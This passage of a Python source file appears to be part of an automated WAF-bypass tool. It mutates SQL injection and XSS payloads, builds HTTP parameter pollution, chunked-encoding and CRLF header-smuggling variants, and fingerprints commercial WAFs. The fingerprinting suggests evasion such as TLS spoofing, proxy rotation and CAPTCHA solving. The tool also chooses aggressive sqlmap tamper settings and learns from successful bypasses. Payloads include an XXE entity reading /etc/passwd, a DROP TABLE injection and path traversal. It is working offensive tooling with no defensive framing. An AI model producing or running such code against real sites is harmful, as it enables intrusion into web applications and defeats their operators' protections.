        # Score and rank with adaptive weighting
        scored = []
        for mut, chain in zip(mutations, mutation_chains):
            score = self._score_mutation(mut, chain, waf_enum)
            scored.append((score, mut, chain))
        
        scored.sort(reverse=True, key=lambda x: x[0])
        
        # Update history
        self.mutation_history.extend([{'payload': s[1], 'score': s[0], 'chain': s[2]} for s in scored[:10]])
        self.generation_count += 1
        
        return [m[1] for m in scored[:25]]
    
    def _score_mutation(self, mutation: str, chain: List[str], waf_type: WAFType) -> float:
        """Score mutation based on bypass probability with adaptive learning"""
        score = 0.5
        
        # Length penalty (shorter is better for evasion)
        score += max(0, (150 - len(mutation)) / 300)
        
        # Complexity bonus
        score += len(chain) * 0.15
        
        # Historical success weighting
        if waf_type and waf_type in self.successful_mutations:
            for pattern in self.successful_mutations[waf_type]:
                if pattern in mutation or mutation in pattern:
                    score += 0.4
        
        # Adaptive weighting based on generation
        for op in chain:
            if waf_type:
                score += self.adaptive_weights[waf_type][op] * 0.1
        
        # Penalty for obvious patterns
        obvious_patterns = ['union select', 'concat(', 'sleep(', 'benchmark(', 'alert(', 'prompt(']
        for pattern in obvious_patterns:
            if pattern.lower() in mutation.lower():
                score -= 0.25
        
        # Bonus for encoding diversity
        encoding_indicators = ['%', '\\x', '\\u', '0x', '&#']
        score += sum(1 for ind in encoding_indicators if ind in mutation) * 0.05
        
        return max(0.0, min(1.0, score))
    
    def learn_from_result(self, original: str, mutation: str, waf_type: str, success: bool):
        """Learn from bypass attempt result with adaptive weight updates"""
        waf_enum = self._str_to_waftype(waf_type)
        if success and waf_enum:
            self.successful_mutations[waf_enum].append(mutation)
            self.successful_mutations[waf_enum] = self.successful_mutations[waf_enum][-200:]
            
            # Update adaptive weights
            for op in self.MUTATION_OPERATORS:
                if op in mutation.lower():
                    self.adaptive_weights[waf_enum][op] = min(1.0, self.adaptive_weights[waf_enum][op] + 0.1)
        else:
            # Penalize unsuccessful operators
            for op in self.MUTATION_OPERATORS:
                if op in mutation.lower():
                    self.adaptive_weights[waf_enum][op] = max(0.0, self.adaptive_weights[waf_enum][op] - 0.05)
    
    def _str_to_waftype(self, waf_str: str) -> Optional[WAFType]:
        """Convert string to WAFType enum"""
        if not waf_str:
            return None
        try:
            return WAFType[waf_str.upper()]
        except KeyError:
            return WAFType.UNKNOWN


class HTTPParameterPollutionEngine:
    """Advanced HTTP Parameter Pollution (HPP) engine v3.0"""
    
    FRAMEWORK_BEHAVIORS = {
        'ASP.NET': {
            'duplicate_handling': 'concat_comma', 
            'delimiter': ',', 
            'vulnerable_to': ['js_injection', 'sql_concat', 'path_traversal'],
            'param_style': 'array_index'
        },
        'PHP': {
            'duplicate_handling': 'last_wins', 
            'delimiter': None, 
            'vulnerable_to': ['array_injection', 'type_juggling', 'null_byte'],
            'param_style': 'bracket_array'
        },
        'JSP': {
            'duplicate_handling': 'first_wins', 
            'delimiter': None, 
            'vulnerable_to': ['parameter_hiding', 'encoding_differential'],
            'param_style': 'plain'
        },
        'PYTHON': {
            'duplicate_handling': 'list_all', 
            'delimiter': None, 
            'vulnerable_to': ['list_manipulation', 'comma_injection'],
            'param_style': 'list'
        },
        'NODEJS': {
            'duplicate_handling': 'array_all', 
            'delimiter': None, 
            'vulnerable_to': ['prototype_pollution', 'array_injection'],
            'param_style': 'array'
        },
        'RUBY': {
            'duplicate_handling': 'last_wins', 
            'delimiter': None, 
            'vulnerable_to': ['symbol_injection', 'yaml_injection'],
            'param_style': 'plain'
        },
        'PERL': {
            'duplicate_handling': 'first_wins', 
            'delimiter': None, 
            'vulnerable_to': ['open_injection', 'backtick_injection'],
            'param_style': 'plain'
        }
    }
    
    def __init__(self):
        self.pollution_patterns = defaultdict(list)
        self.successful_vectors = defaultdict(list)
    
    def generate_hpp_payload(self, base_payload: str, target_framework: str = 'ASP.NET') -> Dict[str, Any]:
        """Generate HPP-based bypass payload with framework-specific optimization"""
        framework = target_framework.upper()
        if framework not in self.FRAMEWORK_BEHAVIORS:
            framework = 'ASP.NET'
        
        behavior = self.FRAMEWORK_BEHAVIORS[framework]
        
        # Generate multiple pollution strategies
        strategies = []
        
        if behavior['duplicate_handling'] == 'concat_comma':
            # ASP.NET style: split and concatenate
            parts = self._split_for_concat(base_payload, behavior['delimiter'])
            strategies.append({
                'type': 'split_concat',
                'params': parts,
                'explanation': f"WAF sees individual params, {framework} concatenates with comma"
            })
            
            # Array index variation
            strategies.append({
                'type': 'array_index',
                'params': [f"{base_payload}[0]", f"{base_payload}[1]"],
                'explanation': "Array notation bypass"
            })
            
        elif behavior['duplicate_handling'] == 'last_wins':
            # PHP style: hide payload in first, legit in last
            strategies.append({
                'type': 'hide_last',
                'params': [base_payload, "1"],
                'explanation': "WAF checks first param, app uses last"
            })
            
            # Null byte truncation for PHP
            if 'null_byte' in behavior['vulnerable_to']:
                strategies.append({
                    'type': 'null_byte',
                    'params': [base_payload + "%00", "ignored"],
                    'explanation': "Null byte truncates second param"
                })
                
        elif behavior['duplicate_handling'] == 'first_wins':
            # JSP style: legit first, payload second (hidden from WAF)
            strategies.append({
                'type': 'hide_first',
                'params': ["1", base_payload],
                'explanation': "WAF checks last param, app uses first"
            })
            
        elif behavior['duplicate_handling'] in ['list_all', 'array_all']:
            # Python/Node style: array manipulation
            strategies.append({
                'type': 'array_manipulation',
                'params': [base_payload, "1", "2"],
                'explanation': "Backend receives array, uses specific index"
            })
        
        param_name = random.choice(['id', 'page', 'query', 'search', 'q', 'data', 'value', 'item'])
        
        # Select best strategy based on historical success
        best_strategy = strategies[0]
        if framework in self.successful_vectors:
            for strat in strategies:
                if strat['type'] in self.successful_vectors[framework]:
                    best_strategy = strat
                    break
        
        return {
            'params': [(param_name, part) for part in best_strategy['params']],
            'framework': framework,
            'handling': behavior['duplicate_handling'],
            'strategy': best_strategy['type'],
            'explanation': best_strategy['explanation'],
            'expected_result': ''.join(best_strategy['params']) if behavior['duplicate_handling'] == 'concat_comma' else best_strategy['params'][-1],
            'bypass_probability': 0.85 if behavior['duplicate_handling'] == 'concat_comma' else 0.6,
            'alternative_strategies': strategies[1:] if len(strategies) > 1 else []
        }
    
    def _split_for_concat(self, payload: str, delimiter: str) -> List[str]:
        """Split payload to exploit comma concatenation"""
        if 'alert' in payload or 'prompt' in payload:
            return ["1'", payload.replace("'", ""), "'2"]
        else:
            # Smart splitting for SQL
            if 'SELECT' in payload.upper():
                parts = re.split(r'(SELECT|UNION|FROM|WHERE)', payload, flags=re.IGNORECASE)
                return [p for p in parts if p]
            else:
                mid = len(payload) // 2
                return [payload[:mid], payload[mid:]]
    
    def generate_json_pollution(self, base_payload: str) -> Dict[str, Any]:
        """Generate JSON-specific parameter pollution"""
        return {
            'type': 'json_wrap',
            'payload': {
                'query': base_payload,
                'data': {'nested': base_payload},
                'array': [base_payload, 'legit']
            },
            'explanation': "Nested JSON structure may bypass WAF parsing",
            'content_type': 'application/json'
        }
    
    def generate_xml_pollution(self, base_payload: str) -> Dict[str, Any]:
        """Generate XML-specific parameter pollution"""
        entities = [
            f'<!ENTITY xxe SYSTEM "file:///etc/passwd">',
            f'<!ENTITY payload "{base_payload}">'
        ]
        return {
            'type': 'xml_wrap',
            'payload': f'''<?xml version="1.0"?>
<!DOCTYPE foo [
    {random.choice(entities)}
]>
<query>{base_payload}</query>''',
            'explanation': "DTD entity injection or XML structure bypass",
            'content_type': 'application/xml'
        }


class ProtocolEvasionEngine:
    """Advanced protocol-level evasion techniques"""
    
    def __init__(self):
        self.chunked_sequences = []
    
    def generate_chunked_payload(self, payload: str) -> Dict[str, Any]:
        """Generate HTTP chunked transfer encoding bypass"""
        chunks = []
        remaining = payload
        
        while remaining:
            chunk_size = random.randint(1, min(10, len(remaining)))
            chunk = remaining[:chunk_size]
            remaining = remaining[chunk_size:]
            chunks.append(f'{hex(chunk_size)[2:]}\r\n{chunk}\r\n')
        
        chunks.append('0\r\n\r\n')
        
        return {
            'type': 'chunked_encoding',
            'body': ''.join(chunks),
            'headers': {'Transfer-Encoding': 'chunked'},
            'explanation': 'Split payload across chunks to evade content inspection'
        }
    
    def generate_http2_downgrade(self, payload: str) -> Dict[str, Any]:
        """Generate HTTP/2 to HTTP/1.1 downgrade smuggling"""
        return {
            'type': 'http2_smuggling',
            'payload': payload,
            'technique': 'h2c_upgrade',
            'explanation': 'Exploit differences between HTTP/2 and HTTP/1.1 parsing'
        }
    
    def generate_header_smuggling(self, payload: str) -> Dict[str, Any]:
        """Generate header smuggling variants"""
        variants = []
        
        # Space before colon
        variants.append({
            'type': 'space_colon',
            'headers': {f'X-Custom {random.randint(1,100)}': payload},
            'explanation': 'Space before colon may bypass header validation'
        })
        
        # Newline in header
        variants.append({
            'type': 'newline_header',
            'headers': {'X-Inject': f'legit\r\nX-Malicious: {payload}'},
            'explanation': 'CRLF injection in header value'
        })
        
        # Duplicate headers
        variants.append({
            'type': 'duplicate_headers',
            'headers': [
                ('X-Query', 'legit'),
                ('X-Query', payload)
            ],
            'explanation': 'Duplicate headers with different values'
        })
        
        return random.choice(variants)


class BehavioralWAFAnalyzer:
    """Enhanced behavioral analysis engine for WAF detection"""
    
    def __init__(self):
        self.observed_behaviors = []
        self.response_time_baseline = None
        self.challenge_solutions = {}
        self.fingerprint_db = {}
        self.ml_features = defaultdict(list)
    
    def analyze_response_behavior(self, response, response_time: float) -> Dict[str, Any]:
        """Analyze WAF behavior from HTTP response with enhanced detection"""
        analysis = {
            'waf_detected': False,
            'waf_type': WAFType.UNKNOWN,
            'confidence': 0.0,
            'behaviors': [],
            'recommendations': [],
            'fingerprint': {},
            'evasion_complexity': 'low'
        }
        
        headers = response.headers if hasattr(response, 'headers') else {}
        cookies = response.cookies if hasattr(response, 'cookies') else {}
        
        # Enhanced CloudFlare detection
        cf_indicators = ['CF-RAY', 'CF-Cache-Status', '__cfduid', 'cf_clearance', '__cf_bm']
        if any(h in headers for h in cf_indicators) or any(c in cookies for c in cf_indicators):
            analysis['waf_detected'] = True
            analysis['waf_type'] = WAFType.CLOUDFLARE
            analysis['confidence'] = 0.95
            analysis['behaviors'].append('cloudflare_proxy')
            analysis['evasion_complexity'] = 'high'
            analysis['recommendations'].extend([
                'Use TLS fingerprint spoofing (JA3/JA4)',
                'Rotate User-Agent per request',
                'Implement cookie jar handling (cf_clearance)',
                'Consider residential proxy rotation',
                'Use browser automation for JS challenges'
            ])
        
        # AWS WAF detection
        aws_indicators = ['x-amzn-requestid', 'x-amzn-waf-action', 'x-amzn-trace-id']
        if any(h in headers for h in aws_indicators):
            analysis['waf_detected'] = True
            analysis['waf_type'] = WAFType.AWS_WAF
            analysis['confidence'] = 0.9
            analysis['behaviors'].append('aws_managed_rules')
            analysis['recommendations'].extend([
                'Implement request timing randomization',
                'Use header order normalization',
                'Rotate TLS fingerprints'
            ])
        
        # Azure WAF detection
        azure_indicators = ['x-mswaf', 'X-Azure-Ref', 'x-ms-ref']
        if any(h in headers for h in azure_indicators):
            analysis['waf_detected'] = True
            analysis['waf_type'] = WAFType.AZURE_WAF
            analysis['confidence'] = 0.88
            analysis['behaviors'].append('azure_managed_rules')
        
        # Akamai detection
        akamai_indicators = ['X-Akamai', 'Akamai-Origin-Hop', 'X-EdgeConnect']
        if any(h in headers for h in akamai_indicators):
            analysis['waf_detected'] = True
            analysis['waf_type'] = WAFType.AKAMAI
            analysis['confidence'] = 0.85
            analysis['behaviors'].append('akamai_ghost')
            analysis['recommendations'].append('Akamai Bot Manager detected - use advanced fingerprint spoofing')
        
        # Imperva/Incapsula detection
        imperva_indicators = ['X-Iinfo', 'Set-Cookie: visid_incap', 'incap_ses']
        if any(h in headers for h in imperva_indicators) or 'visid_incap' in str(cookies):
            analysis['waf_detected'] = True
            analysis['waf_type'] = WAFType.IMPERVA
            analysis['confidence'] = 0.87
            analysis['behaviors'].append('imperva_incapsula')
            analysis['evasion_complexity'] = 'high'
        
        # F5 BIG-IP detection
        f5_indicators = ['X-WA-Info', 'X-Cnection', 'BigIP']
        if any(h in headers for h in f5_indicators):
            analysis['waf_detected'] = True
            analysis['waf_type'] = WAFType.F5_BIG_IP
            analysis['confidence'] = 0.82
            analysis['behaviors'].append('f5_asm')
        
        # Sucuri detection
        sucuri_indicators = ['X-Sucuri', 'X-Sucuri-ID', 'Sucuri']
        if any(h in headers for h in sucuri_indicators):
            analysis['waf_detected'] = True
            analysis['waf_type'] = WAFType.SUCURI
            analysis['confidence'] = 0.8
            analysis['behaviors'].append('sucuri_cloudproxy')
        
        # Rate limiting detection
        if hasattr(response, 'status_code'):
            if response.status_code == 429:
                analysis['behaviors'].append('rate_limited')
                analysis['recommendations'].extend([
                    'Implement exponential backoff (2^N seconds)',
                    'Use distributed proxy rotation',
                    'Add jitter to request timing (±20%)'
                ])
            elif response.status_code == 403:
                analysis['behaviors'].append('blocked_403')
            elif response.status_code == 406:
                analysis['behaviors'].append('not_acceptable')
        
        # Challenge detection
        if hasattr(response, 'status_code') and response.status_code in [403, 503, 200]:
            body = response.text[:8000].lower() if hasattr(response, 'text') else ''
            
            js_challenge_indicators = [
                'checking your browser', 'js-challenge', 'cf-browser-verification',
                'challenge-platform', 'turnstile', 'recaptcha/api.js'
            ]
            if any(ind in body for ind in js_challenge_indicators):
                analysis['behaviors'].append('js_challenge')
                analysis['evasion_complexity'] = 'very_high'
                analysis['recommendations'].extend([
                    'JavaScript challenge detected',
                    'Use Selenium/Playwright with stealth plugins',
                    'Implement CDP (Chrome DevTools Protocol) evasion',
                    'Consider external CAPTCHA solving service'
                ])
            
            captcha_indicators = ['captcha', 'recaptcha', 'g-recaptcha', 'h-captcha', 'cf-captcha']
            if any(ind in body for ind in captcha_indicators):
                analysis['behaviors'].append('captcha_challenge')
                analysis['evasion_complexity'] = 'very_high'
                analysis['recommendations'].append('CAPTCHA challenge - requires solving service or human intervention')
        
        # Timing analysis
        if self.response_time_baseline:
            if response_time > self.response_time_baseline * 3:
                analysis['behaviors'].append('slow_response')
                analysis['recommendations'].append('Possible deliberate delay - WAF may be analyzing request body')
            elif response_time < self.response_time_baseline * 0.5:
                analysis['behaviors'].append('cached_response')
        
        # ML-based anomaly detection (simulated)
        features = self._extract_features(headers, response_time)
        analysis['fingerprint'] = features
        analysis['ml_anomaly_score'] = self._calculate_anomaly_score(features)
        
        return analysis
    
    def _extract_features(self, headers: Dict, response_time: float) -> Dict:
        """Extract behavioral features for fingerprinting"""
        return {
            'header_count': len(headers),
            'header_order': list(headers.keys()),
            'server_header': headers.get('Server', 'unknown'),
            'content_type': headers.get('Content-Type', 'unknown'),
            'response_time_ms': response_time * 1000,
            'timestamp': datetime.now().isoformat()
        }
    
    def _calculate_anomaly_score(self, features: Dict) -> float:
        """Calculate anomaly score using simple heuristic (placeholder for ML model)"""
        score = 0.0
        if features['response_time_ms'] > 1000:
            score += 0.3
        if 'cloudflare' in features['server_header'].lower():
            score += 0.2
        return min(1.0, score)
    
    def build_behavioral_profile(self, target_url: str, sample_count: int = 5) -> WAFBehaviorProfile:
        """Build comprehensive WAF behavioral profile through probing"""
        profile = WAFBehaviorProfile(waf_type=WAFType.UNKNOWN)
        
        # Probe with different payloads to detect behavior
        probe_payloads = [
            "' OR '1'='1",
            "<script>alert(1)</script>",
            "../../../etc/passwd",
            "UNION SELECT NULL--",
            "1; DROP TABLE users--"
        ]
        
        # Note: Actual HTTP requests would be made here
        # For now, return empty profile for later population
        profile.detected_patterns = probe_payloads
        return profile
    
    def _classify_from_behaviors(self, profile: WAFBehaviorProfile) -> WAFType:
        """Classify WAF type from observed behaviors"""
        if 'cloudflare_proxy' in profile.behaviors:
            return WAFType.CLOUDFLARE
        if 'aws_managed_rules' in profile.behaviors:
            return WAFType.AWS_WAF
        if profile.response_codes[403] > 2:
            return WAFType.MODSECURITY
        return WAFType.UNKNOWN


class DynamicKnowledgeBase:
    """Enhanced self-learning knowledge base for WAF bypass techniques"""
    
    def __init__(self, storage_path: str = "memory/waf_knowledge.json"):
        self.storage_path = storage_path
        self.knowledge = {
            'waf_profiles': {},
            'successful_bypasses': [],
            'tamper_effectiveness': {},
            'payload_patterns': {},
            'framework_behaviors': {},
            'protocol_evasion': {},
            'mutation_chains': {},
            'session_fingerprints': {}
        }
        self._load_knowledge()
    
    def _load_knowledge(self):
        """Load persisted knowledge with versioning"""
        try:
            import os
            if os.path.exists(self.storage_path):
                with open(self.storage_path, 'r') as f:
                    loaded = json.load(f)
                    # Merge with defaults for new fields
                    for key in self.knowledge:
                        if key not in loaded:
                            loaded[key] = self.knowledge[key]
                    self.knowledge = loaded
                    logger.info("WAF_KB", f"Loaded knowledge: {len(self.knowledge['successful_bypasses'])} bypasses")
        except Exception as e:
            logger.warning("WAF_KB", f"Could not load knowledge: {e}")
    
    def save_knowledge(self):
        """Persist knowledge to disk with atomic write"""
        try:
            import os
            temp_path = self.storage_path + '.tmp'
            with open(temp_path, 'w') as f:
                json.dump(self.knowledge, f, indent=2, default=str)
            os.replace(temp_path, self.storage_path)
            logger.debug("WAF_KB", "Knowledge saved successfully")
        except Exception as e:
            logger.error("WAF_KB", f"Could not save knowledge: {e}")
    
    def record_success(self, waf_type: str, technique: str, payload: str, context: Dict):
        """Record successful bypass with enhanced metadata"""
        entry = {
            'timestamp': datetime.now().isoformat(),
            'waf_type': waf_type,
            'technique': technique,
            'payload_hash': hashlib.sha256(payload.encode()).hexdigest()[:16],
            'payload_pattern': self._extract_pattern(payload),
            'payload_length': len(payload),
            'context': context,
            'mutation_chain': context.get('mutation_chain', []),
            'response_time': context.get('response_time', 0),
            'headers_used': context.get('headers', {}),
            'session_fingerprint': context.get('session_fp', '')
        }
        
        self.knowledge['successful_bypasses'].append(entry)
        
        # Update technique effectiveness
        if technique not in self.knowledge['tamper_effectiveness']:
            self.knowledge['tamper_effectiveness'][technique] = {
                'successes': 0, 
                'attempts': 0, 
                'rate': 0.0,
                'avg_response_time': 0.0,
                'first_seen': datetime.now().isoformat()
            }
        
        stats = self.knowledge['tamper_effectiveness'][technique]
        stats['successes'] += 1
        stats['attempts'] += 1
        stats['rate'] = stats['successes'] / stats['attempts']
        
        # Update rolling average response time
        old_avg = stats['avg_response_time']
        new_time = context.get('response_time', 0)
        stats['avg_response_time'] = (old_avg * (stats['attempts'] - 1) + new_time) / stats['attempts']
        
        # Keep only last 2000 entries
        self.knowledge['successful_bypasses'] = self.knowledge['successful_bypasses'][-2000:]
        self.save_knowledge()
    
    def get_recommended_techniques(self, waf_type: str) -> List[Tuple[str, float]]:
        """Get techniques ranked by effectiveness with recency weighting"""
        techniques = []
        now = datetime.now()
        
        for tech, stats in self.knowledge['tamper_effectiveness'].items():
            if stats['attempts'] > 0:
                base_rate = stats['rate']
                
                # Recency bonus
                first_seen = datetime.fromisoformat(stats.get('first_seen', now.isoformat()))
                days_old = (now - first_seen).days
                recency_factor = max(0.5, 1.0 - (days_old / 30))  # Decay over 30 days
                
                weighted_rate = base_rate * recency_factor
                techniques.append((tech, weighted_rate, stats['avg_response_time']))
        
        # Sort by weighted rate
        techniques.sort(key=lambda x: x[1], reverse=True)
        return [(t[0], t[1]) for t in techniques[:15]]
    
    def get_waf_profile(self, waf_type: str) -> Dict:
        """Get accumulated profile for specific WAF"""
        bypasses = [b for b in self.knowledge['successful_bypasses'] if b['waf_type'] == waf_type]
        
        if not bypasses:
            return {}
        
        # Analyze patterns
        techniques = Counter(b['technique'] for b in bypasses)
        avg_response_time = sum(b['response_time'] for b in bypasses) / len(bypasses)
        
        return {
            'waf_type': waf_type,
            'total_bypasses': len(bypasses),
            'top_techniques': techniques.most_common(5),
            'avg_response_time': avg_response_time,
            'last_success': bypasses[-1]['timestamp'] if bypasses else None,
            'success_rate': len(bypasses) / max(1, sum(1 for b in self.knowledge['successful_bypasses'] if b['waf_type'] == waf_type))
        }
    
    def _extract_pattern(self, payload: str) -> str:
        """Extract generic pattern from payload for matching"""
        pattern = re.sub(r'\d+', '{num}', payload)
        pattern = re.sub(r"'[^']*'", "'{str}'", pattern)
        pattern = re.sub(r'"[^"]*"', '"{str}"', pattern)
        pattern = re.sub(r'0x[0-9a-fA-F]+', '0x{hex}', pattern)
        return pattern


class WAFIntelligence:
    """
    Advanced WAF detection and bypass recommendation engine v3.0
    Upgraded with adversarial ML, protocol evasion, and multi-vector bypass
    """
    
    # Extended WAF-specific tamper combinations
    TAMPER_COMBINATIONS = {
        WAFType.CLOUDFLARE: [
            ['randomcomments', 'space2comment', 'chardoubleencode'],
            ['base64encode', 'between'],
            ['randomcase', 'space2randomblank', 'percentage'],
            ['charunicodeencode', 'apostrophemask', 'htmlencode'],
            ['hpp', 'space2plus', 'randomcomments'],
        ],
        WAFType.AWS_WAF: [
            ['space2randomblank', 'randomcase'],
            ['charencode', 'space2comment'],
            ['unicodeencode', 'randomcomments'],
            ['modsecurityversioned', 'space2plus'],
            ['between', 'percentage', 'randomcase'],
        ],
        WAFType.AZURE_WAF: [
            ['space2comment', 'between'],
            ['randomcase', 'charencode'],
            ['charunicodeencode', 'space2randomblank'],
            ['hpp', 'percentage'],
            ['base64encode', 'randomcomments'],
        ],
        WAFType.GOOGLE_ARMOR: [
            ['modsecurityversioned', 'space2comment'],
            ['randomcomments', 'percentage'],
            ['charunicodeencode', 'space2plus'],
            ['space2randomblank', 'randomcase'],
        ],
        WAFType.MODSECURITY: [
            ['modsecurityversioned', 'space2comment'],
            ['between', 'randomcomments'],
            ['charunicodeencode', 'apostrophemask'],
            ['chardoubleencode', 'space2plus'],
            ['htmlencode', 'randomcase'],
        ],
        WAFType.AKAMAI: [
            ['randomcomments', 'space2plus'],
            ['apostrophemask', 'space2comment'],
            ['chardoubleencode', 'randomcase'],
            ['charunicodeencode', 'between'],
            ['hpp', 'base64encode'],
        ],
        WAFType.IMPERVA: [
            ['charunicodeencode', 'space2comment'],
            ['randomcomments', 'base64encode'],
            ['hpp', 'charencode'],
            ['space2randomblank', 'randomcase'],
        ],
        WAFType.F5_BIG_IP: [
            ['space2comment', 'apostrophemask'],
            ['between', 'randomcase'],
            ['hpp', 'charencode'],
            ['charunicodeencode', 'space2plus'],
        ],
        WAFType.SUCURI: [
            ['space2comment', 'randomcase'],
            ['unionalltounion', 'space2comment'],
            ['charencode', 'apostrophenullencode'],
            ['randomcomments', 'htmlencode'],
        ],
        WAFType.BARRACUDA: [
            ['space2comment', 'htmlencode'],
            ['base64encode', 'randomcase'],
            ['randomcomments', 'charencode'],
        ],
        WAFType.FORTINET: [
            ['randomcomments', 'space2randomblank'],
            ['chardoubleencode', 'percentage'],
            ['space2comment', 'randomcase'],
        ],
        WAFType.WORDFENCE: [
            ['space2comment', 'randomcase'],
            ['charencode', 'between'],
            ['randomcomments', 'apostrophemask'],
        ],
        WAFType.UNKNOWN: [
            ['space2comment', 'randomcase'],
            ['charencode'],
            ['randomcomments'],
            ['between', 'space2plus'],
        ]
    }
    # Init advanced WAF intelligence components 
    def __init__(self):
        
        self.patterns = WAF_PATTERNS
        self.mutator = SemanticPayloadMutator()
        self.hpp_engine = HTTPParameterPollutionEngine()
        self.protocol_evasion = ProtocolEvasionEngine()
        self.behavioral_analyzer = BehavioralWAFAnalyzer()
        self.knowledge_base = DynamicKnowledgeBase()
        
        logger.debug("WAF", "Advanced intelligence engine v3.0 loaded", {
            "patterns": len(self.patterns),
            "mutation_operators": sum(len(ops) for ops in self.mutator.MUTATION_OPERATORS.values()),
            "hpp_frameworks": len(self.hpp_engine.FRAMEWORK_BEHAVIORS),
            "protocol_evasion": True
        })
    
    def detect_waf(self, logs: List[str]) -> Optional[Dict]:
        """
        Enhanced WAF detection with behavioral analysis
        Same function signature, upgraded internals
        """
        text = '\n'.join(logs).lower()
        
        # Original pattern-based detection
        for waf_type, data in self.patterns.items():
            for pattern in data['patterns']:
                if pattern.lower() in text:
                    logger.info("WAF", f"Detected: {waf_type}", {"pattern": pattern})
                    
                    # Get enhanced recommendations
                    enhanced_data = self._get_enhanced_data(waf_type)
                    
                    return {
                        'detected': True,
                        'waf_type': waf_type,
                        'tampers': enhanced_data['tampers'],
                        'techniques': enhanced_data['techniques'],
                        'recommendation': enhanced_data['recommendation'],
                        'mutation_variants': enhanced_data.get('mutation_variants', []),
                        'hpp_compatible': enhanced_data.get('hpp_compatible', False),
                        'protocol_evasion': enhanced_data.get('protocol_evasion', [])
                    }
        
        return None
    
    def get_bypass_modifications(self, waf_type: str) -> List[str]:
        """
        Enhanced bypass modifications with intelligent tamper selection
        Same function signature, upgraded internals
        """
        if waf_type not in self.patterns:
            return []
        
        waf = self.patterns[waf_type]
        mods = []
        
        # Get knowledge-based recommendations first
        recommended = self.knowledge_base.get_recommended_techniques(waf_type)
        if recommended:
            # Use top recommended tamper
            top_tamper = recommended[0][0]
            mods.extend(['--tamper', top_tamper])
        elif waf['tampers']:
            # Fallback to static config
            mods.extend(['--tamper', ','.join(waf['tampers'][:3])])
        
        # Add delay for rate-limiting WAFs
        if waf_type in ['cloudflare', 'rate_limit', 'aws_waf', 'akamai']:
            delay = self._calculate_delay(waf_type)
            mods.extend(['--delay', str(delay)])
        
        mods.append('--random-agent')
        
        # Add technique selection based on WAF type
        technique = self._select_technique(waf_type)
        mods.extend(['--technique', technique])
        
        # Add level and risk for aggressive WAFs
        if waf_type in ['cloudflare', 'imperva', 'akamai']:
            mods.extend(['--level', '5'])
            mods.extend(['--risk', '3'])
        
        logger.debug("WAF", f"Generated enhanced bypass for {waf_type}", {"mods": mods})
        return mods
    
    def _get_enhanced_data(self, waf_type: str) -> Dict:
        # Get enhanced WAF data with mutations and alternatives 
        base_data = self.patterns[waf_type].copy()
        
        # Generate mutation variants
        test_payload = "' OR '1'='1"
        mutations = self.mutator.mutate_payload(test_payload, waf_type, intensity=3)
        
        # Check HPP compatibility
        hpp_data = self.hpp_engine.generate_hpp_payload(test_payload)
        
        # Generate protocol evasion options
        protocol_options = [
            self.protocol_evasion.generate_chunked_payload(test_payload),
            self.protocol_evasion.generate_header_smuggling(test_payload)
        ]
        
        base_data['mutation_variants'] = mutations[:5]
        base_data['hpp_compatible'] = hpp_data['bypass_probability'] > 0.6
        base_data['hpp_frameworks'] = list(self.hpp_engine.FRAMEWORK_BEHAVIORS.keys())
        base_data['protocol_evasion'] = protocol_options
        
        return base_data
    
    def _calculate_delay(self, waf_type: str) -> int:
        # Calculate optimal delay based on WAF type
        delays = {
            'cloudflare': 3,
            'aws_waf': 4,
            'akamai': 2,
            'mod_security': 1,
            'incapsula': 3,
            'imperva': 4,
            'rate_limit': 5,
            'unknown': 3
        }
        return delays.get(waf_type, 3)
    
    def _select_technique(self, waf_type: str) -> str:
        # Select optimal SQLMap technique based on WAF
        technique_map = {
            'cloudflare': 'BT',
            'aws_waf': 'BT',
            'akamai': 'EUBT',
            'mod_security': 'EUS',
            'incapsula': 'BT',
            'imperva': 'BT',
            'unknown': 'BEUSTQ'
        }
        return technique_map.get(waf_type, 'BEUSTQ')
    
    def generate_intelligent_bypass(self, target_url: str, base_payload: str, 
                                   waf_type: str = None) -> Dict[str, Any]:
        """
        NEW: Generate comprehensive intelligent bypass strategy
        """
        # Detect WAF if not specified
        if not waf_type:
            waf_type = 'unknown'
        
        # Get knowledge-based recommendations
        recommended = self.knowledge_base.get_recommended_techniques(waf_type)
        
        # Generate semantic mutations
        mutations = self.mutator.mutate_payload(base_payload, waf_type, intensity=3)
        
        # Generate HPP variant
        hpp_variant = self.hpp_engine.generate_hpp_payload(base_payload)
        
        # Generate protocol evasion
        chunked_variant = self.protocol_evasion.generate_chunked_payload(base_payload)
        
        # Get tamper strategy
        waf_enum = WAFType[waf_type.upper()] if waf_type.upper() in [e.name for e in WAFType] else WAFType.UNKNOWN
        tamper_sets = self.TAMPER_COMBINATIONS.get(waf_enum, self.TAMPER_COMBINATIONS[WAFType.UNKNOWN])
        
        return {
            'waf_type': waf_type,
            'confidence': 0.8 if waf_type != 'unknown' else 0.5,
            'primary_payload': mutations[0] if mutations else base_payload,
            'alternative_payloads': mutations[1:5] if len(mutations) > 1 else [],
            'hpp_variant': hpp_variant,
            'protocol_evasion': chunked_variant,
            'tamper_scripts': tamper_sets[0],
            'alternative_tampers': tamper_sets[1:],
            'recommended_delay': self._calculate_delay(waf_type),
            'technique': self._select_technique(waf_type),
            'knowledge_based': len(recommended) > 0,
            'top_techniques': [t[0] for t in recommended[:3]]
        }
    
    def learn_from_attempt(self, target: str, payload: str, waf_type: str, 
                          success: bool, response_data: Dict):
        # NEW: Learn from bypass attempt to improve future strategies 
        # Update knowledge base
        self.knowledge_base.record_success(
            waf_type=waf_type,
            technique=','.join(self.TAMPER_COMBINATIONS.get(
                WAFType[waf_type.upper()] if waf_type.upper() in [e.name for e in WAFType] else WAFType.UNKNOWN, 
                ['unknown']
            )[0]),
            payload=payload,
            context=response_data
        )
        
        # Update mutator
        self.mutator.learn_from_result(payload, payload, waf_type, success)
    
    def mutate_payload(self, payload: str, waf_type: str = None, intensity: int = 3) -> List[str]:
        # NEW: Public interface for payload mutation 
        return self.mutator.mutate_payload(payload, waf_type, intensity)
    
    def analyze_behavior(self, response, response_time: float) -> Dict[str, Any]:
        # NEW: Public interface for behavioral analysis 
        return self.behavioral_analyzer.analyze_response_behavior(response, response_time)

waf_intel = WAFIntelligence()